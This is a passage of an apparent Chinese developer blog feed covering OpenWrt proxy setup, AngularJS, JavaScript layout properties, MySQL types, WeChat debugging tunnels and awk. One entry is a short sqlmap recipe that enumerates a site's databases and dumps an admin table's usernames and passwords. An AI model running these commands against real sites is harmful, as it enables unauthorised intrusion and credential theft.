        <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">opkg <span class="keyword">update</span></span><br><span class="line">opkg <span class="keyword">install</span> ip ipset resolveip iptables-<span class="keyword">mod</span>-tproxy resolveip libopenssl luci-i18n-base-zh-cn</span><br><span class="line">reboot</span><br><span class="line">opkg <span class="keyword">update</span>   <span class="comment"># redo </span></span><br><span class="line">wget https://github.com/shadowsocks/ChinaDNS/releases/download/<span class="number">1.3</span><span class="number">.2</span>/ChinaDNS_1<span class="number">.3</span><span class="number">.2</span>_ar71xx.ipk</span><br><span class="line">wget <span class="keyword">http</span>://openwrt-dist.sourceforge.net/releases/ar71xx/packages/shadowsocks-libev-spec_2<span class="number">.4</span><span class="number">.0</span><span class="number">-1</span>_ar71xx.ipk</span><br><span class="line">wget <span class="keyword">http</span>://openwrt-dist.sourceforge.net/releases/luci/packages/luci-app-chinadns_1<span class="number">.3</span><span class="number">.6</span><span class="number">-1</span>_all.ipk</span><br><span class="line">wget <span class="keyword">http</span>://openwrt-dist.sourceforge.net/releases/luci/packages/luci-app-shadowsocks-spec_1<span class="number">.3</span><span class="number">.6</span><span class="number">-1</span>_all.ipk</span><br><span class="line"></span><br><span class="line">opkg <span class="keyword">install</span> ChinaDNS_1<span class="number">.3</span><span class="number">.2</span>_ar71xx.ipk</span><br><span class="line">opkg <span class="keyword">install</span> shadowsocks-libev-spec_2<span class="number">.4</span><span class="number">.0</span><span class="number">-1</span>_ar71xx.ipk</span><br><span class="line">opkg <span class="keyword">install</span> luci-app-chinadns_1<span class="number">.3</span><span class="number">.6</span><span class="number">-1</span>_all.ipk <span class="comment">#chinadns的web界面，不过我的安装没有生效。web上没有出现菜单，但不影响使用</span></span><br><span class="line">opkg <span class="keyword">install</span> luci-app-shadowsocks-spec_1<span class="number">.3</span><span class="number">.6</span><span class="number">-1</span>_all.ipk</span><br><span class="line"></span><br><span class="line">/etc/init.d/chinadns <span class="keyword">enable</span></span><br><span class="line">/etc/init.d/shadowsocks <span class="keyword">enable</span></span><br><span class="line"></span><br><span class="line">wget -O- <span class="string">'http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest'</span> | awk -F\| <span class="string">'/CN\|ipv4/ &#123; printf("%s/%d\n", $4, 32-log($5)/log(2)) &#125;'</span> &gt; /etc/ignore.list</span><br></pre></td></tr></table></figure><p>vim /etc/config/network</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">config interface 'wan'</span><br><span class="line">        option ifname 'eth0'</span><br><span class="line">        option proto 'dhcp'</span><br><span class="line">        option peerdns '<span class="number">0</span>'</span><br><span class="line">        option dns '<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">8.8</span><span class="number">.4</span><span class="number">.4</span> <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span>'</span><br></pre></td></tr></table></figure><p>详情参考：<a href="http://blog.91python.com/openwrt/shadowsocks/2015/10/15/tp720n-openwrt-shadowscoks.html" target="_blank">http://blog.91python.com/openwrt/shadowsocks/2015/10/15/tp720n-openwrt-shadowscoks.html</a></p>]]></content>
      
      
      <categories>
          
          <category> openwrt </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql sqlmap 注入</title>
      <link href="/2015/11/19/mysql/mysql%20sqlmap%20%E6%B3%A8%E5%85%A5/"/>
      <url>/2015/11/19/mysql/mysql%20sqlmap%20%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">假设注入点为 <span class="string">http:</span><span class="comment">//www.abc.com/news.php?id=12</span></span><br><span class="line"><span class="comment">//探测数据库信息</span></span><br><span class="line">sqlmap -u <span class="string">http:</span><span class="comment">//www.abc.com/news.php?id=12 –dbs</span></span><br><span class="line">&gt;db_a</span><br><span class="line">&gt;db_b</span><br><span class="line"><span class="comment">// 选择一个数据库 猜解表名</span></span><br><span class="line">sqlmap -u <span class="string">http:</span><span class="comment">//www.abc.com/news.php?id=12 -D db_b–tables</span></span><br><span class="line"><span class="comment">// 猜解表结构</span></span><br><span class="line">sqlmap -u <span class="string">http:</span><span class="comment">//www.abc.com/news.php?id=12 -D db_b-T sys_admin –columns </span></span><br><span class="line"><span class="comment">// 猜解表内容</span></span><br><span class="line">sqlmap -u <span class="string">http:</span><span class="comment">//www.abc.com/news.php?id=12 -D db_b -T sys_admin -C id,admin_name,pwd –dump</span></span><br></pre></td></tr></table></figure><p>内容来自<a href="http://www.myhacklife.com/%E5%AF%B9%E4%BA%8Emysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5" target="_blank">Myhacklife</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>angularjs filter cut string</title>
      <link href="/2015/11/11/js/angularjs%20filter%20cut%20string/"/>
      <url>/2015/11/11/js/angularjs%20filter%20cut%20string/</url>
      
        <content type="html"><![CDATA[<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">angular.<span class="keyword">module</span>(<span class="string">'App.controllers.MyCtrl'</span>, [])</span><br><span class="line">.controller(<span class="string">'MyCtrl'</span>, <span class="keyword">function</span> (my) &#123;&#125;)</span><br><span class="line"><span class="built_in">.filter</span>(<span class="string">'cut'</span>, <span class="keyword">function</span> () &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">function</span> (<span class="keyword">value</span>, wordwise,<span class="built_in"> max</span>,<span class="built_in"> tail</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">value</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">           <span class="built_in"> max</span> = parseInt<span class="built_in">(max</span>, <span class="number">10</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">!max</span>) <span class="keyword">return</span> <span class="keyword">value</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">value</span>.length &lt;=<span class="built_in"> max</span>) <span class="keyword">return</span> <span class="keyword">value</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">value</span> = <span class="keyword">value</span>.substr(<span class="number">0</span>,<span class="built_in"> max</span>);</span><br><span class="line">            <span class="keyword">if</span> (wordwise) &#123;</span><br><span class="line">                var lastspace = <span class="keyword">value</span>.lastIndexOf(<span class="string">' '</span>);</span><br><span class="line">                <span class="keyword">if</span> (lastspace != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">value</span> = <span class="keyword">value</span>.substr(<span class="number">0</span>, lastspace);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">value</span> + <span class="built_in">(tail</span> || <span class="string">'...'</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">&#123;&#123; Desc | <span class="string">cut:</span><span class="string">true:</span><span class="number">15</span>:<span class="string">'...'</span> &#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angularjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js中 关于top、clientTop、scrollTop、offsetTop的用法</title>
      <link href="/2015/11/05/js/Js%E4%B8%AD%20%E5%85%B3%E4%BA%8Etop%E3%80%81clientTop%E3%80%81scrollTop%E3%80%81offsetTop%E7%9A%84%E7%94%A8%E6%B3%95/"/>
      <url>/2015/11/05/js/Js%E4%B8%AD%20%E5%85%B3%E4%BA%8Etop%E3%80%81clientTop%E3%80%81scrollTop%E3%80%81offsetTop%E7%9A%84%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>网页可见区域宽： document.body.clientWidth;<br>网页可见区域高： document.body.clientHeight;<br>网页可见区域宽： document.body.offsetWidth(包括边线的宽);<br>网页可见区域高： document.body.offsetHeight(包括边线的宽);<br>网页正文全文宽： document.body.scrollWidth;<br>网页正文全文高： document.body.scrollHeight;<br>网页被卷去的高： document.body.scrollTop;<br>网页被卷去的左： document.body.scrollLeft;<br>网页正文部分上： window.screenTop;<br>网页正文部分左： window.screenLeft;<br>屏幕分辨率的高： window.screen.height;<br>屏幕分辨率的宽： window.screen.width;<br>屏幕可用工作区高度： window.screen.availHeight;</p><p>屏幕可用工作区宽度：window.screen.availWidth;</p><p>1、offsetLeft</p><p>假设 obj 为某个 HTML 控件。</p><p>obj.offsetTop 指 obj 距离上方或上层控件的位置，整型，单位像素。</p><p>obj.offsetLeft 指 obj 距离左方或上层控件的位置，整型，单位像素。</p><p>obj.offsetWidth 指 obj 控件自身的宽度，整型，单位像素。</p><p>obj.offsetHeight 指 obj 控件自身的高度，整型，单位像素。</p><p>我们对前面提到的“上方或上层”与“左方或上层”控件作个说明。</p><p>例如：</p><div id="”tool”"><input type="”button”" value="”提交”"><input type="”button”" value="”重置”"></div><p>“提交”按钮的 offsetTop 指“提交”按钮距“tool”层上边框的距离，因为距其上边最近的是 “tool” 层的上边框。<br>“重置”按钮的 offsetTop 指“重置”按钮距“tool”层上边框的距离，因为距其上边最近的是 “tool” 层的上边框。</p><p>“提交”按钮的 offsetLeft 指“提交”按钮距“tool”层左边框的距离，因为距其左边最近的是 “tool” 层的左边框。<br>“重置”按钮的 offsetLeft 指“重置”按钮距“提交”按钮右边框的距离，因为距其左边最近的是“提交”按钮的右边框。</p><p>以上属性在 FireFox 中也有效。</p><p>另 外：我们这里所说的是指 HTML 控件的属性值，并不是 document.body，document.body 的值在不同浏览器中有不同解释（实际上大多数环境是由于对 document.body 解释不同造成的，并不是由于对 offset 解释不同造成的），点击这里查看不同点。<br>标题：offsetTop 与 style.top 的区别</p><p>预备知识：offsetTop、offsetLeft、offsetWidth、offsetHeight</p><p>我们知道 offsetTop 可以获得 HTML 元素距离上方或外层元素的位置，style.top 也是可以的，二者的区别是：</p><p>一、offsetTop 返回的是数字，而 style.top 返回的是字符串，除了数字外还带有单位：px。</p><p>二、offsetTop 只读，而 style.top 可读写。</p><p>三、如果没有给 HTML 元素指定过 top 样式，则 style.top 返回的是空字符串。</p><p>offsetLeft 与 style.left、offsetWidth 与 style.width、offsetHeight 与 style.height 也是同样道理。<br>标题：clientHeight、offsetHeight和scrollHeight</p><p>我们这里说说四种浏览器对 document.body 的 clientHeight、offsetHeight 和 scrollHeight 的解释，这里说的是 document.body，如果是 HTML 控件，则又有不同，点击这里查看。</p><p>这四种浏览器分别为IE（Internet Explorer）、NS（Netscape）、Opera、FF（FireFox）。</p><p>2、clientHeight<br>clientHeight<br>大家对 clientHeight 都没有什么异议，都认为是内容可视区域的高度，也就是说页面浏览器中可以看到内容的这个区域的高度，一般是最后一个工具条以下到状态栏以上的这个区域，与页面内容无关。</p><p>offsetHeight<br>IE、Opera 认为 offsetHeight = clientHeight + 滚动条 + 边框。<br>NS、FF 认为 offsetHeight 是网页内容实际高度，可以小于 clientHeight。</p><p>scrollHeight<br>IE、Opera 认为 scrollHeight 是网页内容实际高度，可以小于 clientHeight。<br>NS、FF 认为 scrollHeight 是网页内容高度，不过最小值是 clientHeight。</p><p>简单地说<br>clientHeight 就是透过浏览器看内容的这个区域高度。<br>NS、 FF 认为 offsetHeight 和 scrollHeight 都是网页内容高度，只不过当网页内容高度小于等于 clientHeight 时，scrollHeight 的值是 clientHeight，而 offsetHeight 可以小于 clientHeight。<br>IE、Opera 认为 offsetHeight 是可视区域 clientHeight 滚动条加边框。scrollHeight 则是网页内容实际高度。</p><p>同理<br>clientWidth、offsetWidth 和 scrollWidth 的解释与上面相同，只是把高度换成宽度即可。</p><p>但是<br>FF 在不同的 DOCTYPE 中对 clientHeight 的解释不同， xhtml 1 trasitional 中则不是如上解释的。其它浏览器则不存在此问题。<br>标题：scrollTop、scrollLeft、scrollWidth、scrollHeight</p><p>3、scrollLeft<br>scrollTop 是“卷”起来的高度值，示例：</p><div style="”width:100px;height:100px;background-color:#FF0000;overflow:hidden;”" id="”p”"><div style="”width:50px;height:300px;background-color:#0000FF;”" id="”t”">如果为 p 设置了 scrollTop，这些内容可能不会完全显示。</div></div><script type="”text/javascript”">var p = document.getElementById(“p”);p.scrollTop = 10;</script><p>由于为外层元素 p 设置了 scrollTop，所以内层元素会向上卷。</p><p>scrollLeft 也是类似道理。</p><p>我们已经知道�0�2offsetHeight 是自身元素的宽度。</p><p>而 scrollHeight 是内部元素的绝对宽度，包含内部元素的隐藏的部分。</p><p>上述中 p 的 scrollHeight 为 300，而 p 的 offsetHeight 为 100。</p><p>scrollWidth 也是类似道理。</p><p>IE 和 FireFox 全面支持，而 Netscape 和 Opera 不支持 scrollTop、scrollLeft（document.body 除外）。<br>发表时间：2007-10-15 20:20:16<br>标题：offsetTop、offsetLeft、offsetWidth、offsetHeight<br>4、clientLeft</p><p>返回对象的offsetLeft属性值和到当前窗口左边的真实值之间的距离，可以理解为边框的长度</p><p>一直以来对offsetLeft，offsetTop，scrollLeft，scrollTop这几个方法很迷糊，花了一天的时间好好的学习了一下．得出了以下的结果：<br>1.offsetTop<br>当前对象到其上级层顶部的距离.<br>不能对其进行赋值.设置对象到页面顶部的距离请用style.top属性.</p><p>2.offsetLeft :<br>当前对象到其上级层左边的距离.<br>不能对其进行赋值.设置对象到页面左部的距离请用style.left属性.</p><p>3.offsetWidth :<br>当前对象的宽度.<br>与style.width属性的区别在于:如对象的宽度设定值为百分比宽度,则无论页面变大还是变小,style.width都返回此百分比,而offsetWidth则返回在不同页面中对象的宽度值而不是百分比值</p><p>4.offsetHeight :<br>与style.height属性的区别在于:如对象的宽度设定值为百分比高度,则无论页面变大还是变小,style.height都返回此百分比,而offsetHeight则返回在不同页面中对象的高度值而不是百分比值</p><p>5.offsetParent:<br>当前对象的上级层对象.<br>注意.如果对象是包括在一个DIV中时,此DIV不会被当做是此对象的上级层,(即对象的上级层会跳过DIV对象)上级层是Table时则不会有问题.<br>利用这个属性，可以得到当前对象在不同大小的页面中的绝对位置．</p><p>6.scrollLeft :<br>对象的最左边到对象在当前窗口显示的范围内的左边的距离．<br>即是在出现了横向滚动条的情况下，滚动条拉动的距离．</p><p>7.scrollTop<br>对象的最顶部到对象在当前窗口显示的范围内的顶边的距离．<br>即是在出现了纵向滚动条的情况下，滚动条拉动的距离．</p><p>我们这里说说四种浏览器对 document.body 的 clientHeight、offsetHeight 和 scrollHeight 的解释，这里说的是 document.body，如果是 HTML 控件，则又有不同，点击这里查看。</p><p>这四种浏览器分别为IE（Internet Explorer）、NS（Netscape）、Opera、FF（FireFox）。</p><p>clientHeight<br>大家对 clientHeight 都没有什么异议，都认为是内容可视区域的高度，也就是说页面浏览器中可以看到内容的这个区域的高度，一般是最后一个工具条以下到状态栏以上的这个区域，与页面内容无关。</p><p>offsetHeight<br>IE、Opera 认为 offsetHeight = clientHeight + 滚动条 + 边框。<br>NS、FF 认为 offsetHeight 是网页内容实际高度，可以小于 clientHeight。</p><p>scrollHeight<br>IE、Opera 认为 scrollHeight 是网页内容实际高度，可以小于 clientHeight。<br>NS、FF 认为 scrollHeight 是网页内容高度，不过最小值是 clientHeight。</p><p>简单地说<br>clientHeight 就是透过浏览器看内容的这个区域高度。<br>NS、 FF 认为 offsetHeight 和 scrollHeight 都是网页内容高度，只不过当网页内容高度小于等于 clientHeight 时，scrollHeight 的值是 clientHeight，而 offsetHeight 可以小于 clientHeight。<br>IE、Opera 认为 offsetHeight 是可视区域 clientHeight 滚动条加边框。scrollHeight 则是网页内容实际高度。</p><p>同理<br>clientWidth、offsetWidth 和 scrollWidth 的解释与上面相同，只是把高度换成宽度即可。</p><p>说明<br>以 上基于 DTD HTML 4.01 Transitional，如果是 DTD XHTML 1.0 Transitional 则意义又会不同，在 XHTML 中这三个值都是同一个值，都表示内容的实际高度。新版本的浏览器大多支持根据页面指定的 DOCTYPE 来启用不同的解释器。下载或浏览测试文件。</p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql中，int(10)和int(11)有什么区别</title>
      <link href="/2015/11/05/mysql/Mysql%E4%B8%AD%EF%BC%8Cint(10)%E5%92%8Cint(11)%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB/"/>
      <url>/2015/11/05/mysql/Mysql%E4%B8%AD%EF%BC%8Cint(10)%E5%92%8Cint(11)%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>首先说一下mysql的数值类型，MySQL支持所有标准SQL数值数据类型。这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。</p><p>作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><p>类型    字节    最小值    最大值<br>(带符号的/无符号的)    (带符号的/无符号的)<br>TINYINT    1    -128    127<br>0    255<br>SMALLINT    2    -32768    32767<br>0    65535<br>MEDIUMINT    3    -8388608    8388607<br>0    16777215<br>INT    4    -2147483648    2147483647<br>0    4294967295<br>BIGINT    8    -9223372036854775808    9223372036854775807<br>0    18446744073709551615<br>Mysql类型关键字后面的括号内指定整数值的显示宽度(例如，INT(4))。该可选显示宽度规定用于显示宽度小于指定的列宽度的值时从左侧填满宽度。显示宽度并不限制可以在列内保存的值的范围，也不限制超过列的指定宽度的值的显示。</p><p>当结合可选扩展属性ZEROFILL使用时， 默认补充的空格用零代替。例如，对于声明为INT(5) ZEROFILL的列，值4检索为00004。请注意如果在整数列保存超过显示宽度的一个值，当MySQL为复杂联接生成临时表时会遇到问题，因为在这些情况下MySQL相信数据适合原列宽度。</p><p>所有整数类型可以有一个可选(非标准)属性UNSIGNED。当你想要在列内只允许非负数和该列需要较大的上限数值范围时可以使用无符号值。</p><p>所以int(10)与int(11)后的括号中的字符表示显示宽度，整数列的显示宽度与mysql需要用多少个字符来显示该列数值，与该整数需要的存储空间的大小都没有关系，int类型的字段能存储的数据上限还是2147483647(有符号型)和4294967295(无符号型)。</p><p>浮点和定点类型也可以为UNSIGNED。同数类型，该属性防止负值保存到列中。然而，与整数类型不同的是，列值的上范围保持不变。</p><p>如果为一个数值列指定ZEROFILL，MySQL自动为该列添加UNSIGNED属性。</p><p>对于浮点列类型，在MySQL中单精度值使用4个字节，双精度值使用8个字节。</p><p>FLOAT类型用于表示近似数值数据类型。SQL标准允许在关键字FLOAT后面的括号内选择用位指定精度(但不能为指数范围)。MySQL还支持可选的只用于确定存储大小的精度规定。0到23的精度对应FLOAT列的4字节单精度。24到53的精度对应DOUBLE列的8字节双精度。</p><p>MySQL允许使用非标准语法：FLOAT(M,D)或REAL(M,D)或DOUBLE PRECISION(M,D)。这里，“(M,D)”表示该值一共显示M位整数，其中D位位于小数点后面。例如，定义为FLOAT(7,4)的一个列可以显示为-999.9999。MySQL保存值时进行四舍五入，因此如果在FLOAT(7,4)列内插入999.00009，近似结果是999.0001。</p><p>MySQL将DOUBLE视为DOUBLE PRECISION(非标准扩展)的同义词。MySQL还将REAL视为DOUBLE PRECISION(非标准扩展)的同义词，除非SQL服务器模式包括REAL_AS_FLOAT选项。</p><p>为了保证最大可能的可移植性，需要使用近似数值数据值存储的代码应使用FLOAT或DOUBLE PRECISION，不规定精度或位数。</p><p>DECIMAL和NUMERIC类型在MySQL中视为相同的类型。它们用于保存必须为确切精度的值，例如货币数据。当声明该类型的列时，可以(并且通常要)指定精度和标度；例如：</p><p>salary DECIMAL(5,2)<br>在该例子中，5是精度，2是标度。精度表示保存值的主要位数，标度表示小数点后面可以保存的位数。</p><p>在MySQL 5.1中以二进制格式保存DECIMAL和NUMERIC值。</p><p>标准SQL要求salary列能够用5位整数位和两位小数保存任何值。因此，在这种情况下可以保存在salary列的值的范围是从-999.99到999.99。</p><p>在标准SQL中，语法DECIMAL(M)等价于DECIMAL(M,0)。同样，语法DECIMAL等价于DECIMAL(M,0)，可以通过计算确定M的值。在MySQL 5.1中支持DECIMAL和NUMERIC数据类型的变量形式。M默认值是10。</p><p>DECIMAL或NUMERIC的最大位数是65，但具体的DECIMAL或NUMERIC列的实际范围受具体列的精度或标度约束。如果此类列分配的值小数点后面的位数超过指定的标度允许的范围，值被转换为该标度。(具体操作与操作系统有关，但一般结果均被截取到允许的位数）。</p><p>BIT数据类型可用来保存位字段值。BIT(M)类型允许存储M位值。M范围为1到64。</p><p>要指定位值，可以使用b’value’符。value是一个用0和1编写的二进制值。例如，b’111′和b’100000000′分别表示7和128。</p><p>From：<a href="http://digdeeply.org/archives/03211905.html" target="_blank" rel="noopener">http://digdeeply.org/archives/03211905.html</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>微信开发本地调试</title>
      <link href="/2015/11/03/php/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/"/>
      <url>/2015/11/03/php/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>整体思路是在外网将微信的请求转发至本地</p><p>方案 1(base windows)<br>使用ngrok 地址 <a href="https://ngrok.com/" target="_blank" rel="noopener">https://ngrok.com/</a><br>下载并注册ngrok 获取自己的token<br>cmd到ngrok程序目录<br>执行 ngrok 80(端口) 获取一个地址  通过此地址映射外网地址到本地80端口 例如<a href="http://a1b2c3.ngrok.com" target="_blank" rel="noopener">http://a1b2c3.ngrok.com</a><br>详细方案请参考 <a href="http://www.zhihu.com/question/25456655" target="_blank">微信开发如何做本地调试</a></p><p>方案 2 (base VPS)<br>线上nginx将 your.domain.com:80 请求转发到 127.0.0.1:9999 </p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> your.domain.com;</span><br><span class="line"> </span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://127.0.0.1:9999;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地执行</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">your</span><span class="selector-class">.domain</span><span class="selector-class">.com</span> <span class="selector-tag">-R</span> 9999<span class="selector-pseudo">:127.0.0.1</span><span class="selector-pseudo">:8888</span></span><br></pre></td></tr></table></figure><p>本地程序监听127.0.0.1:8888即可<br>详细方案请参考 <a href="http://blog.lazybee.me/wechat-development/" target="_blank">微信接入调试方案</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php fastcgi_param白屏问题</title>
      <link href="/2015/10/31/php/php%20fastcgi_param%E7%99%BD%E5%B1%8F%E9%97%AE%E9%A2%98/"/>
      <url>/2015/10/31/php/php%20fastcgi_param%E7%99%BD%E5%B1%8F%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>访问php白屏(base on lnmp)<br>vim nginx/conf/fastcgi_param</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span>  REDIRECT_STATUS    <span class="number">200</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux 常用命令</title>
      <link href="/2015/10/31/linux/linux%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2015/10/31/linux/linux%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>常用命令</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">wc -l `find . -name <span class="string">"*.css"</span>`|tail -n1</span><br></pre></td></tr></table></figure><p>指定目录下 在指定后缀文件 查找关键字</p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> ./ -<span class="built_in">name</span> <span class="string">"*"</span> -<span class="built_in">exec</span> grep <span class="string">"string"</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux awk</title>
      <link href="/2015/10/31/linux/linux%20awk/"/>
      <url>/2015/10/31/linux/linux%20awk/</url>
      
        <content type="html"><![CDATA[<p>引用：<a href="http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html" target="_blank" rel="noopener">http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html</a><br><code><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">awk</span> [-F <span class="string">':'</span> ]  <span class="string">'&#123;print <span class="variable">$1</span>&#125;'</span>  filename</span><br><span class="line">cat filename | awk [-F <span class="string">':'</span> ]  <span class="string">'&#123;print <span class="variable">$1</span>&#125;'</span></span><br><span class="line">```&lt;/code&gt;</span><br><span class="line">&lt;code&gt;</span><br></pre></td></tr></table></figure></code></p><p>[root@local yang]# tail /etc/passwd |awk -F ':' 'BRGIN {print "name,shell"} {print $1"---"$7} END {print "nameEND,shellEND"}'<br>ntp---/sbin/nologin<br>apache---/sbin/nologin<br>saslauth---/sbin/nologin<br>postfix---/sbin/nologin<br>pulse---/sbin/nologin<br>nameEND,shellEND</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索并打印所在行</span><br><span class="line">&lt;code&gt;</span><br></pre></td></tr></table></figure><p>[root@local yang]# awk -F: '/root/' /etc/passwd #红色部分为正则<br>root:x:0:0:root:/root:/bin/bash<br>operator:x:11:0:operator:/root:/sbin/nologin</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,......以此类推</span><br><span class="line"></span><br><span class="line">搜索并打印所在行（过滤输出）</span><br></pre></td></tr></table></figure><p>[root@local yang]# awk -F: '/root/{print $1}' /etc/passwd<br>root<br>operator</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">内置变量</span><br></pre></td></tr></table></figure><p>ARGC 命令行参数个数<br>ARGV 命令行参数排列<br>ENVIRON 支持队列中系统环境变量的使用<br>FILENAME awk浏览的文件名（输入是文件的时候才会有文件名 如果是搜索别的命令的输出 则不会有文件名）<br>FNR 浏览文件的记录数<br>FS 设置输入域分隔符，等价于命令行 -F选项<br>NF 浏览记录的域的个数（列）<br>NR 已读的记录数（行）<br>OFS 输出域分隔符<br>ORS 输出记录分隔符<br>RS 控制记录分隔符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">变量输出示例</span><br></pre></td></tr></table></figure><p>[root@local yang]# awk -F: '{print "filename:"FILENAME " no:"NR " cols:"NF}' /etc/passwd<br>filename:/etc/passwd no:1 cols:7<br>filename:/etc/passwd no:2 cols:7<br>......</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">使用<span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>[root@local yang]# awk -F: '{printf("filename:%s no:%s cols:%s %s\n",FILENAME,NR,NF,$0)}' /etc/passwd<br>filename:/etc/passwd no:1 cols:7 root:x:0:0:root:/root:/bin/bash<br>filename:/etc/passwd no:2 cols:7 bin:x:1:1:bin:/bin:/sbin/nologin<br>filename:/etc/passwd no:3 cols:7 daemon:x:2:2:daemon:/sbin:/sbin/nologin<br>filename:/etc/passwd no:4 cols:7 adm:x:3:4:adm:/var/adm:/sbin/nologin<br>filename:/etc/passwd no:5 cols:7 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br>filename:/etc/passwd no:6 cols:7 sync:x:5:0:sync:/sbin:/bin/sync<br>filename:/etc/passwd no:7 cols:7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br>......</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">变量示例</span><br></pre></td></tr></table></figure><p>[root@local yang]# awk -F: '{cnt++;print cnt,$1}END{print"cnt:"cnt}' /etc/passwd<br>1 root<br>2 bin<br>3 daemon<br>7 shutdown<br>......<br>......<br>35 www<br>36 mysql<br>cnt:36</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">统计文件夹下文件占用字节数<span class="comment">(不含子文件夹)</span></span><br></pre></td></tr></table></figure><p>[root@local yang]# ll| awk 'BEGIN {size=0}{size=size+$5}END{print"total size:"size}'<br>total size:126062</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">以M计算</span><br></pre></td></tr></table></figure><p>[root@local yang]# ll| awk 'BEGIN {size=0}{size=size+$5}END{print"total size:"size/1024/1024"M"}'<br>total size:126062</p><figure class="highlight 